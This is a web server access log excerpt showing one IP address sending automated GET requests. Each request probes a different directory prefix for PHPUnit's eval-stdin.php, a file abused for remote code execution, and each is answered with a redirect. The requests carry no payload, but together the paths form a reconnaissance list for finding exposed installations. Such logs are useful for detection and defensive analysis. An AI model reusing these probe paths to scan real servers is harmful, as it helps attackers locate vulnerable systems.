103.226.248.206 - - [12/Jan/2025:23:17:20 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:21 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:21 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:21 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:21 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:22 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:22 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:22 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:22 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:23 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:23 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:23 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:23 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:24 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:24 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:24 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:25 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:25 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:25 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:25 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:26 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:26 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:26 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:26 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:27 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:27 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:27 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:27 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
103.226.248.206 - - [12/Jan/2025:23:17:28 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
